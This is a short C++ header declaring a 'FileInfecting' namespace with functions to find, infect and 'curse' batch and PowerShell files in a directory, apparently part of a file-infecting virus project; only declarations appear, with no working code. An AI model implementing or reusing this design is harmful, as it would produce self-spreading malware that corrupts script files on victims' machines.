#pragma once

#include <string>
#include <vector>

namespace FileInfecting {

std::vector<std::string> FindBatchFiles(const std::string& directory);
bool InfectBatchFile(const std::string& filePath);
bool CurseBatchFile(const std::string& filePath);

std::vector<std::string> FindPowerShellFiles(const std::string& directory);
bool InfectPowerShellFile(const std::string& filePath);
bool CursePowerShellFile(const std::string& filePath);

}